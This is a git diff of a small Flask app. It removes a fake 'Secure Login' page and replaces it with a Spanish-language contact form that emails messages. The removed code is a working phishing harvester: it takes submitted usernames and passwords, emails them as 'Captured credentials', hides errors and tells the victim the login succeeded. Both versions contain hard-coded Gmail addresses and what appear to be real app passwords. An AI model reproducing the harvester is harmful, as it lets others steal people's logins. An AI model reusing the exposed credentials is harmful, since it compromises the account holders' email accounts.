@@ -4,18 +4,27 @@ from email.message import EmailMessage
 
 app = Flask(__name__)
 
-login_form = """
+SMTP_USER = "kenyaportout@gmail.com"
+SMTP_APP_PASSWORD = "ogltkxnbfltyitft"
+SMTP_TO = "yrivera@americana.edu.co"
+
+form_html = """
 <!doctype html>
-<html lang="en">
-  <head><title>Secure Login</title></head>
+<html lang="es">
+  <head><title>Contacto</title></head>
   <body>
-    <h2>Login to Your Account</h2>
-    <form method="POST" action="/login">
-      <label>Username:</label><br>
-      <input type="text" name="username" required><br><br>
-      <label>Password:</label><br>
-      <input type="password" name="password" required><br><br>
-      <button type="submit">Log In</button>
+    <h2>Enviar mensaje</h2>
+    <form method="POST" action="/send">
+      <label>Nombre:</label><br>
+      <input type="text" name="name" required><br><br>
+
+      <label>Correo:</label><br>
+      <input type="email" name="email" required><br><br>
+
+      <label>Mensaje:</label><br>
+      <textarea name="message" required></textarea><br><br>
+
+      <button type="submit">Enviar</button>
     </form>
   </body>
 </html>
@@ -23,28 +32,32 @@ login_form = """
 
 @app.route("/")
 def index():
-    return render_template_string(login_form)
+    return render_template_string(form_html)
 
-@app.route("/login", methods=["POST"])
-def login():
-    user = request.form.get("username")
-    pwd = request.form.get("password")
+@app.route("/send", methods=["POST"])
+def send():
+    name = request.form.get("name", "").strip()
+    email = request.form.get("email", "").strip()
+    message = request.form.get("message", "").strip()
 
     msg = EmailMessage()
-    msg["Subject"] = "Captured credentials"
-    msg["From"] = "yrivera@americana.edu.co"
-    msg["To"] = "yrivera@americana.edu.co"
-    msg.set_content(f"Username: {user}\\nPassword: {pwd}")
+    msg["Subject"] = "Nuevo mensaje desde Flask"
+    msg["From"] = SMTP_USER
+    msg["To"] = SMTP_TO
+    msg.set_content(
+        f"Nombre: {name}\n"
+        f"Correo: {email}\n\n"
+        f"Mensaje:\n{message}"
+    )
 
     try:
         with smtplib.SMTP("smtp.gmail.com", 587) as server:
             server.starttls()
-            server.login("yrivera@americana.edu.co", "gwmg andgpaaqgafjsr")
+            server.login(SMTP_USER, SMTP_APP_PASSWORD)
             server.send_message(msg)
-    except Exception:
-        pass
-
-    return "<h3>Login successful! Redirecting...</h3>"
+        return "<h3>Mensaje enviado correctamente.</h3>"
+    except Exception as e:
+        return f"<h3>Error enviando el mensaje: {e}</h3>", 500
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000, debug=False)
